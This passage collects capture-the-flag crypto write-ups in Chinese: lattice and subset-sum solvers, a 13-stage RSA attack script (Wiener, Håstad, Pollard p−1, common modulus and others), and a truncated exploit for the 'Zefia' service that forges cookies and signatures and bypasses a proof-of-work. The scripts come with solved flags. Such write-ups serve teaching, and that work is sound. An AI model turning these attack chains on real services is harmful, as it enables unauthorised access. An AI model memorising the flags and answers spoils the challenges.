10. LLL(δ=0.99) 后遍历短行，取前 24 维为 `f`、后 24 维为 `g`，要求系数全 ∈ {-1, 0, 1}；`key = sha256(bytes(canon(f,g)+1))`，`canon` 取 24 个循环移位与取负中的字典序最小，逐候选解密并以 unpad 成功判定。

## EXP

P1（MITM 子集和，含 40 个 96 bit 权重与全部公开量）：

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from hashlib import sha256

a = [49376672650614815152695846227, 50107005195622727263138822166, 73426884702304738602485157561, 43903151154072241726227082897, 62370129022338094788788019041, 73821460391680659553143109845, 59598724343226440717773778290, 44724299693508263338379788760, 43359001629044998367046344287, 51112669943121613804516609493, 66223592355554184529133411680, 53263699124365930014381881469, 49479375886052044578105904373, 65652268342927100620549238921, 42249853594867235500116021275, 77010877430913021230684983353, 44734179676509451677215727582, 63181120949811919454148429519, 57921704901493584109095296485, 77471223609637562708706095565, 61435142380338689907843871976, 49563875974155624795696814703, 54613556935956105095725106578, 45925673700458045513033134942, 48162497136740451583368093025, 62662740248714064200096775322, 69154100029464092783827821730, 68942064432822364353277284277, 55016682113686355893693560682, 55434628325298596164018661205, 49103634676327584488228327121, 54009460385700804956077210335, 40582589842016665601080577271, 57180415723752791566721028224, 78850420720873405142010660272, 41433391453776740856719964314, 65409374198639865528055274049, 75311392197956687213545618351, 53024465056249747143040271142, 65038172356169909755236638486]
target = 1149587623746691892018161789342
iv = bytes.fromhex("7e7f9b4911193bc59c5662e2463c04bf")
enc_flag = bytes.fromhex("0b90450cedf8747e11f231db37bcdb40")

n = len(a)
half = n // 2


def enum_half(vals):
    d = {}
    m = len(vals)
    for mask in range(1 << m):
        s = 0
        mm = mask
        i = 0
        while mm:
            if mm & 1:
                s += vals[i]
            mm >>= 1
            i += 1
        d[s] = mask
    return d


L = enum_half(a[:half])
R = enum_half(a[half:])

bits = None
for s, mask in L.items():
    need = target - s
    if need in R:
        bits = [(mask >> i) & 1 for i in range(half)] + [(R[need] >> i) & 1 for i in range(n - half)]
        break
assert bits is not None, "no solution"
assert sum(ai * bi for ai, bi in zip(a, bits)) == target

sec = bytes(int("".join(map(str, bits[i:i + 8])), 2) for i in range(0, 40, 8))
key = sha256(sec).digest()
pt = AES.new(key, AES.MODE_CBC, iv).decrypt(enc_flag)
print(unpad(pt, 16))
```

P2（LLL + Babai 最近平面，含完整的 24×24 公开基 `B`、`target`、`iv`、`enc_flag`）：

```python
from sage.all import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from hashlib import sha256

Bdat = [
[-228044,1030012,-990846,39,83,176860,-29,213,-61,-176,210292,-69,-216,81,126,163,558520,252693,-71,-593263,-502623,448179,301,-366],
[0,257490,38,-26,-4,-54,-20,28,-56,-2,51,-8,-55,51,-16,6,139639,100,-23,20,-25,-26,17,-39],
[0,0,0,-206515,59,38,-12,-31,62,-53,-4,-42,-3,-55,-24,33,-42,21,423310,-296760,68,-118,4,-180],
[-912176,208,2724880,5,295948,531874,-302,492855,-245119,135394,840969,506832,-742,398035,448,-722,558874,236,-748,1335288,1005147,-447730,1211561,-692884],
[912176,-208,-990728,-152,-296088,-120,-34,410,350,-270470,-80,128,402,-126,-194,456,-160,120,306,-593702,-502702,223935,423,-591],
[-228044,52,-54,59,19,-17,30,-62,-22,54,3,-40,-61,23,22,-64,-23,-22,-50,43,-502148,448652,197,118],
[0,0,-743208,63,60,-75,63,93,123,-126,-93,-57,75,-84,63,153,-48,-96,102,-296641,-502393,224192,191,-123],
[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,-251080,50,47,28],
[0,514980,-247660,-31,12,-133,-19,87,-71,-46,71,-35,-85,74,-11,63,279262,168,-12,-148290,-141,-122,49,-151],
[0,0,0,-413030,118,708848,-347042,-164331,182,-362,840972,506618,237973,397444,454,-214180,558563,-1514790,846795,-593677,236,237,1818003,-979],
[0,0,0,0,0,354386,-126,78,42,-108,420418,158,-70,-397746,203899,-31,168,-225,-18,-143,79,-259,605946,-135],
[0,0,-743208,413093,-58,-151,87,155,-1,-20,-85,27,238127,49,170,25,-16,-126,-846496,296902,-502467,224392,223,266],
[0,0,0,0,0,885965,-315,195,105,269772,1051113,273,-149,397536,514,-33,359,-281,-212020,-64,131,-90,1514701,-434],
[0,0,0,-619545,177,354500,-173545,0,489292,-329,420436,253269,237844,198644,354,-4,279119,-757331,1270154,-890253,402,-93,757399,-713],
[-456088,-1029856,1733892,75,147960,-176792,55,-511,-177,135507,-210218,-16,-71,33,-28,-506,-558447,-505249,-145,1038506,878,793,302734,803],
[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,-139662,-43,-41,-9,43,-35,-55,55],
[0,-1029960,1486264,-22,-104,-176827,17,-337,-43,314,-210227,67,105,-2,-146,-329,-558511,-505157,-26,889985,698,650,302855,552],
[0,0,-247736,21,20,354361,-105,-164346,85,-86,420431,-253107,-14,198674,94,82,-279191,-237,-206,-148439,72,-239,605815,230799],
[912176,-515188,-1734012,-37,-296020,-87,69,447,245124,-270597,-285,106,523,-306,-42,592,-279517,-160,514,-742013,-1004949,448252,523,-561],
[0,0,495472,-619587,137,-354222,-173335,328692,44,-147,-420406,252977,-238156,-198866,-122,-34,279063,-757131,1270146,-593457,250,181,-303007,-462361],
[0,0,0,-619545,177,114,-173419,-78,978328,-231,-2,253149,713878,-69,422,-168,278862,-757194,1270464,-890102,589,-55,-61,-273],
[0,0,-743208,63,60,177118,0,-493233,150,270054,115,-506648,177,-247,-16,81,-558374,-434,-51,-445058,69,-485,-338,693158],
[1824352,-416,-1733720,-325,-592196,-354601,37,165166,615,-540854,-420591,129,786,-198978,-510,830,-431,368,690,-1038962,-1005362,448003,-605124,-231911],
[0,-514980,-76,52,8,108,40,-56,112,4,-102,16,110,-102,32,214111,-279223,-247,91,15,60,-8,-38,68],
]
target = vector(ZZ, [-1596318,515341,-4955029,2065945,-2072724,-1419263,694775,432,-2933967,2025772,3363982,-1394,-235762,-992581,1018400,-1714121,-2234039,-4294714,-1272274,-2372694,4767975,3585146,2423600,694789])
iv = bytes.fromhex('b6f1a72b936f3b204ef14fcbf376d6f4')
enc_flag = bytes.fromhex('62ded74963ef75dbb7d72dcd8f71ac20')

n = 24
B0 = Matrix(ZZ, Bdat)


def babai(basis, t):
    basis = [vector(QQ, r) for r in basis]
    t = vector(QQ, t)
    G = [vector(QQ, [0] * n) for _ in range(n)]
    mu = [[QQ(0)] * n for _ in range(n)]
    for i in range(n):
        G[i] = basis[i]
        for j in range(i):
            mu[i][j] = (basis[i].dot_product(G[j])) / G[j].dot_product(G[j])
            G[i] -= mu[i][j] * G[j]
    b = t
    for i in range(n - 1, -1, -1):
        c = (b.dot_product(G[i]) / G[i].dot_product(G[i])).round()
        b -= c * basis[i]
    return t - b


def decrypt(v):
    vv = vector(ZZ, [int(x) for x in v])
    err = target - vv
    assert max(abs(int(x)) for x in err) <= 16
    key = sha256(",".join(str(int(x)) for x in vv).encode()).digest()
    pt = AES.new(key, AES.MODE_CBC, iv).decrypt(enc_flag)
    return unpad(pt, 16)


v = babai(B0.LLL(delta=0.99), target)
print(decrypt(v))
```

P3（NTRU 格 LLL，含 `N`、`q`、`h` 与 `canon`/去重逻辑）：

```python
from sage.all import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from hashlib import sha256

N, q = 24, 40961
h = [23958,15729,7156,1979,28224,13751,14812,35320,14308,36622,4765,39863,20314,38455,18270,17306,25800,9615,33241,32729,15530,9761,12080,21944]
iv = bytes.fromhex('5e82ce397d9ff4f7deca9549fdc5f26f')
enc_flag = bytes.fromhex('bc3c00b09e35e27a5b6805fcb7f370d8')


def H(i, j):
    return h[(j - i) % N]


M = Matrix(ZZ, 2 * N, 2 * N)
for i in range(N):
    M[i, i] = 1
    for j in range(N):
        M[i, N + j] = H(i, j)
for i in range(N):
    M[N + i, N + i] = q


def rotate(v, shift):
    shift = int(shift) % len(v)
    return list(v[shift:]) + list(v[:shift])


def canonical_pair(f, g):
    candidates = []
    for shift in range(N):
        pair = list(rotate(f, shift)) + list(rotate(g, shift))
        candidates.append(tuple(int(x) for x in pair))
        candidates.append(tuple(-int(x) for x in pair))
    return min(candidates)


L = M.LLL(delta=0.99)
seen = set()
done = False
for row in L.rows():
    v = [int(x) for x in row]
    for cand in (v, [-x for x in v]):
        f, g = cand[:N], cand[N:]
        if max(abs(x) for x in f) > 1 or max(abs(x) for x in g) > 1:
            continue
        canon = canonical_pair(f, g)
        if canon in seen:
            continue
        seen.add(canon)
        key = sha256(bytes(int(x) + 1 for x in canon)).digest()
        pt = AES.new(key, AES.MODE_CBC, iv).decrypt(enc_flag)
        try:
            print(unpad(pt, 16))
            done = True
            break
        except Exception:
            continue
    if done:
        break
```

<div class="pagebreak"></div>

# The Thirteen Seals of RSA Writeup

纯agent一把梭的,看看agent的思路吧.

这些是crypto的基础吧,很遗憾我数学不好所以理解不能,致歉.

- 分类：crypto
- 附件：the_thirteen_seals_of_rsa.zip
- flag：`TSCTF-J{Happy_RSA_Learning_with_Cryptohack!!}`

## 思路

1. 题目把 45 字节 flag 切成 13 段分别封装：第 1–11 关各 3 字节，第 12 关 5 字节，第 13 关 7 字节；每段单独 RSA 加密，段与段之间没有连锁，可任选顺序独立攻破。
2. 每一关都是一个独立的 RSA 变体，公开参数里各泄漏一种信息，对应一种经典攻击：

| 关号 | 泄漏/场景 | 攻击方法 |
| --- | --- | --- |
| 01 | `e = 11`，256 位素数、3 字节明文，且断言 `m**e < n`（无回绕） | 小明文攻击：对 `c` 直接开 11 次整数方根得 `m` |
| 02 | `e = 3`，34 位素数，`m < n < m**e`，回绕倍数 `k = m**e//n` 满足 `1 <= k < 1000` | 小指数 + 枚举 k：遍历 `k ∈ [1,1000)`，开方验证 `iroot(c + k*n, 3)` |
| 03 | 直接给出 `p`、`q`（均 `% 4 == 3`），只给 `c = m² mod n`，`m < 2^56` | Rabin 攻击：`mp = c^((p+1)/4) mod p`、`mq = c^((q+1)/4) mod q`，CRT 合并四组根，取可打印且 `m < 2^56` 的根 |
| 04 | `d = getPrime(64)` 且断言 `3*d < isqrt(isqrt(n))`，`e` 很大 | Wiener 攻击：对 `e/n` 连分数展开，逐项检验 `phi` 并解二次方程 `x² - (n-phi+1)x + n = 0` |
| 05 | `e = 3`，同一明文对 3 个互素 24 位模数 `ns` 广播（`c != m**e`，`m**e < N`） | Håstad 广播攻击：对 3 组 `(c, n)` 做 CRT 得 `m³ mod N`，再开立方 |
| 06 | `p-1` 由 1000 以内小素数构造（`p-1` 平滑），公开 `B = 1000`、`base = 2` | Pollard p−1：取 `M = lcm(1..B)` 的各素数幂之积，`gcd(2^M - 1, n)` 分解 n |
| 07 | `p+1` 由 1000 以内小素数构造（`p+1` 平滑），公开 `B = 1000`、`lucas_seed` | Williams p+1：Lucas 序列 `V_M(P, 1) mod n`（快速倍增），`gcd(V - 2, n)` 分解 n |
| 08 | 同一 `n` 下两次加密，`e1 = 65537`、`e2 = 17`，`gcd(e1, e2) = 1` | 共模攻击：扩展欧几里得求 `a*e1 + b*e2 = 1`，由 `c1^a * c2^b mod n` 还原 `m`（负指数取模逆） |
| 09 | 直接给出 `p`、`q`，并泄漏 `dp = d mod (p-1)`、`dq = d mod (q-1)` | 已知 p、q 与 dp、dq 的 CRT 解密：`m1 = c^dp mod p`、`m2 = c^dq mod q`，CRT 合并 |
| 10 | 只泄漏 `dp`，`e = 257` 为小素数 | 小 e 下穷举 k：对 `k ∈ [1, e)` 检验 `(e*dp - 1) % k == 0`，候选 `p = (e*dp-1)//k + 1` 整除 `n` 即命中 |
| 11 | 只泄漏 `dp`，但 `e = getPrime(128)` 很大 | 大 e 下利用 `a^(e*dp) ≡ a (mod p)`：搜索小底数 `a`，`gcd(a^(e*dp) - a, n)` 分解 n |
| 12 | 同时给出 `n`、`e`、`d`；flag 段先用 `sha256(min(p,q))[:5]` 异或掩码 | 已知 (e,d) 分解 n：由 `e*d - 1 = 2^t * k` 做 Miller–Rabin 式平方探测（`g^k` 反复平方，遇非平凡 `1` 取 `gcd(x-1, n)`）得因子，再以 `sha256(long_to_bytes(factor))` 前 5 字节解掩码 |
| 13 | 128 位 `p`、`q`，泄漏 `p ^ q`；生成时限定了候选数上限 | 已知 p⊕q：从最低位起逐比特枚举 `p` 的比特（`q` 比特由异或位确定），保留满足 `(p*q) mod 2^(i+1) == n mod 2^(i+1)` 的候选，最后筛出 `p*q == n` |

3. 各关的公开参数与实解：

| 关号 | 关键参数 |
| --- | --- |
| 01 | `e = 11`；`c = 146829305182375288119122252770970240658990019129863733620417344167467191739` |
| 02 | `e = 3`，`n = 141712967660494314613`，`c = 26757016392053533056`，`k_bound = 1000`；实解 `k = 1` |
| 03 | `p % 4 == 3`、`q % 4 == 3`，`c = 23826347738176`，`m < 2^56` |
| 04 | 256 位 `p`、`q`；`d = getPrime(64)`，条件 `3*d < isqrt(isqrt(n))` |
| 05 | `e = 3`；`ns = [168459671921953, 191541313236781, 121682806134937]`（24 位素数之积） |
| 06 | `e = 65537`，`B = 1000`，`base = 2`；`p-1` 平滑、约 112–136 位 |
| 07 | `e = 65537`，`B = 1000`，`lucas_seed = 3`；`p+1` 平滑、约 112–136 位 |
| 08 | 256 位 `p`、`q`；`e1 = 65537`、`e2 = 17`；实解 `a = -8`、`b = 30841` |
| 09 | 256 位 `p`、`q`；`e = 65537`；同时给出 `dp`、`dq` |
| 10 | `e = 257`，只给 `dp`；实解 `k = 130` |
| 11 | `e = getPrime(128)`（本题 `e = 233933241888124326381493312354168157149`），只给 `dp`；实解 `base = 2` |
| 12 | `e = 65537`，给出 `d`；`masked = '9eaa0a4f98'`，`part_length = 5` |
| 13 | `FACTOR_BITS = 128`，`e = 65537`，给出 `p_xor_q`；生成时限定候选数 `<= 4096` |

4. 13 关全部解出后按 01→13 顺序拼接，即为 45 字节的完整 flag。各关片段依次为 `TSC`、`TF-`、`J{H`、`app`、`y_R`、`SA_`、`Lea`、`rni`、`ng_`、`wit`、`h_C`、`rypto`、`hack!!}`；头部 `TSCTF-J{` 恰由第 01–03 段拼出、尾部 `hack!!}` 恰由第 11–13 段拼出，可据此交叉确认分段与顺序。

## EXP

以下代码给出 13 关的求解逻辑：先定义通用工具（精确整数 k 次根、CRT、素筛、Lucas 序列、扩展欧几里得、由单个因子还原明文），再逐关代入题目给出的公开参数。

```python
import random
from math import gcd, isqrt
from hashlib import sha256
from Crypto.Util.number import inverse, long_to_bytes


def iroot(n, k):
    if n == 0:
        return 0
    x = 1 << ((n.bit_length() + k - 1) // k)
    while True:
        y = ((k - 1) * x + n // x ** (k - 1)) // k
        if y >= x:
            break
        x = y
    while x ** k > n:
        x -= 1
    while (x + 1) ** k <= n:
        x += 1
    return x


def crt(r1, m1, r2, m2):
    return (r1 + m1 * ((r2 - r1) * pow(m1, -1, m2) % m2)) % (m1 * m2)


def egcd(a, b):
    if b == 0:
        return a, 1, 0
    g, x, y = egcd(b, a % b)
    return g, y, x - (a // b) * y


def cont_frac(a, b):
    while b:
        yield a // b
        a, b = b, a - (a // b) * b


def primes_upto(B):
    sieve = bytearray(b"\x01") * (B + 1)
    sieve[:2] = b"\x00\x00"
    for i in range(2, isqrt(B) + 1):
        if sieve[i]:
            sieve[i * i:: i] = b"\x00" * (((B - i * i) // i) + 1)
    return [i for i, ok in enumerate(sieve) if ok]


def lcm_powers(B):
    M = 1
    for r in primes_upto(B):
        p = r
        while p * r <= B:
            p *= r
        M *= p
    return M


def lucas_v(P, k, mod):
    v0, v1 = 2 % mod, P % mod
    for bit in bin(k)[2:]:
        t0, t1, t2 = (v0 * v0 - 2) % mod, (v0 * v1 - P) % mod, (v1 * v1 - 2) % mod
        v0, v1 = (t0, t1) if bit == "0" else (t1, t2)
    return v0


def rsa_decrypt(n, e, c, p):
    return long_to_bytes(pow(c, inverse(e, (p - 1) * (n // p - 1)), n))


# 01 小明文：m**e < n，直接开 11 次方根
n, e, c = 10697360455168718512959129183972814603580463848790111484949764154455249600943731095959656130147591132190876836702055782953327194109064356087709996933732131, 11, 146829305182375288119122252770970240658990019129863733620417344167467191739
m = iroot(c, e)
assert m ** e == c < n
p01 = long_to_bytes(m)

# 02 小指数回绕：m**e = c + k*n，枚举 k < k_bound
n, e, c, k_bound = 141712967660494314613, 3, 26757016392053533056, 1000
p02 = None
for k in range(1, k_bound):
    m = iroot(c + k * n, e)
    if m ** e == c + k * n:
        p02 = long_to_bytes(m)
        break

# 03 Rabin：p、q % 4 == 3，四组平方根 CRT 合并
p, q, c = 78618122415698687727251078451109145440294587931348076166411625157290336194323, 70068194590650872266570572115266810127933946443699670783141720130585522796679, 23826347738176
n = p * q
mp, mq = pow(c, (p + 1) // 4, p), pow(c, (q + 1) // 4, q)
p03 = None
for rp in (mp, p - mp):
    for rq in (mq, q - mq):
        m = crt(rp, p, rq, q)
        assert m * m % n == c
        b = long_to_bytes(m)
        if m < (1 << 56) and all(32 <= x < 127 for x in b):
            p03 = b

# 04 Wiener：d 很小，对 e/n 连分数展开逐项检验
n, e, c = 7297717526980528803416151454296405543230501769792380224675788523837314043127326139076479288035857949142724168362589486899807096653717101268027396129754087, 983811702816974382973246581428198957793880120537552344799328942701778206113546592340385294586917077106490499330586393966740719479436824552594359051268947, 1403121770503832384963635118647377948005021775505670157212968759139769785924044936766749890516337665028344892741458301995617829694653904346225542682489494
p04 = None
pn2, pn1, qn2, qn1 = 0, 1, 1, 0
for a in cont_frac(e, n):
    k, d = a * pn1 + pn2, a * qn1 + qn2
    pn2, pn1, qn2, qn1 = pn1, k, qn1, d
    if k == 0 or (e * d - 1) % k:
        continue
    s = n - (e * d - 1) // k + 1
    disc = s * s - 4 * n
    if disc >= 0 and isqrt(disc) ** 2 == disc and (s + isqrt(disc)) % 2 == 0:
        p04 = long_to_bytes(pow(c, d, n))
        break

# 05 Håstad 广播：CRT 到 m**3 mod N 后开立方
ns = [168459671921953, 191541313236781, 121682806134937]
cs = [113988162100414, 134266412261690, 103381083808023]
M = 1
for x in ns:
    M *= x
X = sum(cc * (M // x) * pow(M // x, -1, x) for cc, x in zip(cs, ns)) % M
e = 3
m = iroot(X, e)
assert m ** e == X
p05 = long_to_bytes(m)

# 06 Pollard p-1：M = lcm(1..B) 的各素数幂之积
n, e, c, B, base = 2712306556559763808426699732201038325824103875070017412043339352083065444519, 65537, 1063654136871833959400822391060898403468734523621550865501052704689319385613, 1000, 2
pp = gcd(pow(base, lcm_powers(B), n) - 1, n)
assert pp not in (1, n)
p06 = rsa_decrypt(n, e, c, pp)

# 07 Williams p+1：Lucas 序列快速倍增
n, e, c, B, seed = 1645805333837152607934095779460166446930452329822505925180897273431458002903, 65537, 234897157295601761942812968150518948710991285522334945370417840513712669944, 1000, 3
pp = gcd(lucas_v(seed, lcm_powers(B), n) - 2, n)
assert pp not in (1, n)
p07 = rsa_decrypt(n, e, c, pp)

# 08 共模攻击：a*e1 + b*e2 = 1，负指数走模逆
n, e1, c1, e2, c2 = 8400009419138695910804970691920723756785030355732998911092868061414146714477854944899316726529269377075632385660578819142297053949438099379906832144947201, 65537, 2896227839187858398178206499518965941718191212885057721148078901085329304725813880069012579949556291385407750998513036269912022847133938406192606110838892, 17, 750620281300177733139837497221065603281875751741382657794014480052389628498506207015558504134084206000619394217350889
g, aa, bb = egcd(e1, e2)
assert g == 1


def pom(c, x):
    return pow(c, x, n) if x >= 0 else pow(pow(c, -1, n), -x, n)


p08 = long_to_bytes(pom(c1, aa) * pom(c2, bb) % n)

# 09 已知 p、q 与 dp、dq：CRT 解密
p, q, e = 92846344728165029698823191602062979395864470199885662167132535192535120769703, 79083904181192792548198212770286480104542987550793886758046252256619209947693, 65537
dp, dq, c = 65139919901750584640003209635211495683687815124139688213448189086359840288553, 35454234840588147731184089741730428184866220871109071010851228123834307451869, 1611591659078345564921170100493454412292606116081947160664766818091024028695932665020913793857079098074985148866782972650848685161795082291858780334412736
m = crt(pow(c, dp, p), p, pow(c, dq, q), q)
assert pow(m, e, p * q) == c
p09 = long_to_bytes(m)

# 10 只泄漏 dp，e 小：穷举 k ∈ [1, e)
n, e, c, dp = 9460131066359266468788833334579383276150484130720743994002730915200858260917061130076483260890707415517010486254620791100235958305302984145273626972672999, 257, 6796015256021034972034259915633403022849288420453328565897544459582825237036604026174426090075054159216334976661748064761475046620384242378287414477467625, 43964537730781832214449334922171418913817000459044580540062224280774699349693
p10 = None
for k in range(1, e):
    if (e * dp - 1) % k:
        continue
    pp = (e * dp - 1) // k + 1
    if n % pp == 0:
        p10 = rsa_decrypt(n, e, c, pp)
        break

# 11 只泄漏 dp，e 大：gcd(a**(e*dp) - a, n) 分解
n, e, c, dp = 5874329114497967390507438736604670392476285763534326161370743880820853709670826455676341908954803917511821188082307877579333598246039475910742789459720007, 233933241888124326381493312354168157149, 4298291465212310183395459860413764671484994753424961634222136896703504567297911306750766767223612052124009885313207768993923583353486782167784606527942854, 1883200197447215220065640315373497450163417384907032738630488936981022009309
base = 2
pp = gcd(pow(base, e * dp, n) - base, n)
assert pp not in (1, n)
p11 = rsa_decrypt(n, e, c, pp)

# 12 已知 (e,d)：e*d - 1 = 2^t * k，Miller-Rabin 式平方探测分解 n，再解 sha256 掩码
n, e, d = 8503089791925365287782471640465936117278175170874205550284692826233792073624556943731553431238967039282724297430980638129204322270877326287420008155735407, 65537, 8051837120971302384828301685088965462291015349028523158599230237930373717091945168567639590619778187920343618037937749944179597955940603861509494756609633
masked, part_len = bytes.fromhex("9eaa0a4f98"), 5
k = e * d - 1
t = 0
while k % 2 == 0:
    k //= 2
    t += 1
random.seed(1337)
p = q = None
while True:
    g = random.randrange(2, n - 1)
    x = pow(g, k, n)
    if x in (1, n - 1):
        continue
    for _ in range(t - 1):
        y = x * x % n
        if y == 1:
            p = gcd(x - 1, n)
            break
        x = y
    if p and p not in (1, n):
        break
q = n // p
assert p * q == n
factor = min(p, q)
mask = sha256(long_to_bytes(factor)).digest()[:part_len]
p12 = bytes(a ^ b for a, b in zip(masked, mask))

# 13 已知 p^q：自最低位起逐比特枚举候选
n, e, c = 101797258854899255732997041295560310207949814998589764740705924731263981600223, 65537, 77227542784031353829300239142632829221475859923686565851109749339836732658104
pxorq, FACTOR_BITS = 41069405756483526319882384075447613846, 128
cands = {(1, 1)}
for i in range(1, FACTOR_BITS):
    tgt = n & ((1 << (i + 1)) - 1)
    new = set()
    for pl, ql in cands:
        for bit in (0, 1):
            pp_ = pl | (bit << i)
            qq_ = ql | ((bit ^ ((pxorq >> i) & 1)) << i)
            if (pp_ * qq_) & ((1 << (i + 1)) - 1) == tgt:
                new.add((pp_, qq_))
    cands = new
pp = next(a for a, b in cands if a * b == n)
p13 = rsa_decrypt(n, e, c, pp)

parts = [p01, p02, p03, p04, p05, p06, p07, p08, p09, p10, p11, p12, p13]
flag = b"".join(parts)
assert len(flag) == 45 and all(32 <= b < 127 for b in flag)
print(flag.decode())
```

<div class="pagebreak"></div>

# Zefia Writeup

纯agent一把梭的,看看agent的思路吧.

- 分类：crypto
- flag：`TSCTF-J{e7bc177d-a14c-0ee8-d8fe-8f1a9da1fc6c}`

## 思路

1. **拿 MASTER_KEY（menu 1）**：`Challenge.__init__` 用 `os.urandom(1/1/2/2)` 生成四个子密钥，各自 `pad16`（`ljust(16, b'\x00')`）后异或得 `MASTER_KEY` → 只有前 2 字节非零，密钥空间 **2^16**。menu 1 返回 `IV ‖ AES-CBC(MK, IV, pad16(b"role=guest"))`，明文已知且只有 1 个分组，故枚举 `bytes([hi,lo]) + b"\x00"*14`，比对 `AES_ECB(MK, pad16("role=guest") ⊕ IV) == ct` 即得密钥。
2. **伪造 admin cookie**：`check_admin()` 的 IV 完全取自 cookie 前 16 字节且无 MAC。有密钥时自选 IV 重算 `AES_ECB(MK, pad16("role=admin") ⊕ IV')`；零密钥时复用 guest 密文块，令 `IV' = IV ⊕ pad16("role=guest") ⊕ pad16("role=admin")` 即可通过 `b'role=admin' in pt`。
3. **WOTS 伪造（menu 4）**：`WOTSPLUS` 里 `cs_key_count = 0`（校验和链被关闭）、`w = 16`、`msg_key_count = 8`。验证是 `_chain(sig[i], val, 15) == pubkey[i]`，取 `digest = ffffffff` 使每位 `val = 15 = w-1` → 迭代 **0 次** → **签名就是公钥**（公钥硬编码在题目源码中）。通过后服务端直接下发 `rsa_key.export_key()`。
4. **进 flag 分支（menu 3）**：`proof_of_work` 先做**字符串**比较 `k1_hex != k2_hex` 才 `bytes.fromhex`，而 `fromhex` 不区分大小写 → 同一串字节用不同大小写提交即可让 `md5(k1) == md5(k2)`。取 `k1 = 1F1F1F1F0E0E0E0E`、`k2 = 1f1f1f1f0e0e0e0e`、`p_bytes = k1_bytes + k2_bytes`（全小写 hex），则 `sha512(p) == sha512(k1‖k2)` 天然成立，而 `p_hex != k1_hex + k2_hex` → 拿到 `AES_MK(G(flag_encrypted))`，其中 `G(x) = ADMIN_IV ⊕ E(ADMIN_IV ⊕ x)`，`E = 3DES-EDE`，密钥由攻击者自选。
5. **把加密预言机当解密用**：`G = T_a ∘ E ∘ T_a`（`T_a(x) = x ⊕ ADMIN_IV`）与 `E` 共轭。取 DES 弱密钥 `0x1f1f1f1f0e0e0e0e`（对合）并令 `k1 = k2 = K`，则 `E = DES_K` 对合 ⇒ `G² = id` ⇒ `G(G(y)) = y`。第二次调用 `super_encrypt`，把上一步剥掉外层 AES 得到的 `y` 作为 `p` 送回，剥掉外层 AES 即得 `flag_encrypted`（`ADMIN_IV` 无需知道）。送回时服务端会 `pad(y, 8)` 补 8 字节 `0x08`，而 ECB 按 8 字节分组独立作用，`G(y ‖ 0x08*8)` 的前 256 字节仍正好是 `G(y)`，故取前 256 字节。
6. **RSA-OAEP 解密**：`flag_encrypted = PKCS1_OAEP(pub).encrypt(load_flag())`，用第 3 步偷到的私钥解密。因 `load_flag()` 交付的是 `pad(FLAG, 8)`，明文末尾还带 PKCS#7 填充，需 `unpad(raw, 8)`。
7. menu 2 的四重 AES 是诱饵：其密钥熵 8/16/8/16 bit，中间相遇约 2^32 次 AES，而 menu 1 只要 2^16 次。题目状态（RSA 私钥、flag 密文、`ADMIN_IV`、`MASTER_KEY`）每次连接重新生成，整条链必须在同一 TCP 连接内顺序完成。

### 参数与提示对照

| 菜单 | 交互 | 用到的量 |
| --- | --- | --- |
| 1 Get guest cookie | 送 `1`，回 `IV ‖ AES-CBC` 共 32 字节 hex | `role=guest` 只占 1 个分组 → 已知明文对 |
| 2 AeS4 encrypt | 送 `2`，回 `AES_k4∘AES_k3∘AES_k2∘AES_k1(pad16("role=admin"))` | 诱饵，未使用 |
| 3 super_encrypt | 依次送 admin cookie / `key1`(16 hex) / `key2`(16 hex) / `plaintext` | `k1‖k2` 必须是 16 字节 3DES 密钥 |
| 4 WOTS verify | 送 `digest`(8 hex) / `signature`(512 hex) | 本 writeup 用 `ffffffff` + 公钥 |
| 5 Quit | 送 `5` | — |

| 参数 | 值 | 出处 |
| --- | --- | --- |
| `w` / `msg_key_count` / `cs_key_count` | 16 / 8 / 0 | `WOTSPLUS.__init__` |
| digest 位数 | 8 hex = 4 字节 | menu 4 提示 `digest (hex, 8 chars)` |
| 签名长度 | 512 hex = 8 × 32 字节 | `hex_to_32byte_chunks` + `key_count = 8` |
| RSA 模长 / OAEP 密文 | 2048 bit / 256 字节 | `RSA.generate(2048)` |
| PoW 条件 | `len==16`、`k1_hex != k2_hex`、`md5(k1)==md5(k2)` | `proof_of_work` |
| flag 分支条件 | `sha512(p)[:6] == sha512(k1‖k2)[:6]` 且 `p_hex != k1_hex + k2_hex` | `super_encrypt` |
| `ADMIN_IV` | `os.urandom(256)` | `Challenge.__init__` |

## EXP

完整利用流程：枚举 MASTER_KEY、伪造 admin cookie、WOTS 伪造换 RSA 私钥、用对合性质还原 `flag_encrypted`、OAEP 解密。整条链必须在同一连接内顺序完成，`HOST`/`PORT` 为目标实例。

```python
import os
import re
import socket
import ssl

from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad

HOST, PORT = "<TARGET>", "<PORT>"
USE_TLS = False                      # 目标在 TLS 终结后面时置 True（SNI 取 HOST）
ADMIN_BYPASS = "key"                 # "key"：用枚举出的 MASTER_KEY 造 cookie；"cbc"：零密钥翻转 IV

WOTS_PUBKEY_HEX = (
    "5057432973dc856a7a00272d83ea1c14de52b5eb3ba8b70b373db8204eb2f902"
    "450e38dbade5e9b8c2c3f8258edc4b7e8101e94ac86e4b3cba92ddf3d5de2a2b"
    "454c067a995060d1664669b45974b15b3423cec342024fe9ccd4936670ec3aba"
    "ae4f6b97279bd8eb26463a8cb3112e6dcbf6301e4142b9cdc4adfb644c7b114a"
    "f4f0cf8f80e22c3975ba477dc4769c3ef67ffdf2090735d81d07bc2e6235af1e"
    "e41ef332215422d31208c2bc2163d6690bd32f4926b2858ca41c12eec88c0a30"
    "0571901a3f674288e4a623220fb6b70e558d9819d2f23da6d897278f4056c346"
    "d7f729f5f70805ad4e5bd25cfa502c0625ac02185e014cf36db4ebcdb3ed1a38"
)
WEAK_KEY_HEX = "1f1f1f1f0e0e0e0e"    # DES 弱密钥，对合
WEAK_UPPER, WEAK_LOWER = WEAK_KEY_HEX.upper(), WEAK_KEY_HEX.lower()
RSA_CT_LEN = 256


def xor(a, b):
    return bytes(x ^ y for x, y in zip(a, b))


class Link:
    def __init__(self, host, port, timeout=180.0, use_tls=False):
        raw = socket.create_connection((host, port), timeout=timeout)
        if use_tls:
            raw = ssl.create_default_context().wrap_socket(raw, server_hostname=host)
        self.sock, self.buf = raw, bytearray()

    def read_until(self, token):
        while True:
            i = self.buf.find(token)
            if i >= 0:
                end = i + len(token)
                data = bytes(self.buf[:end])
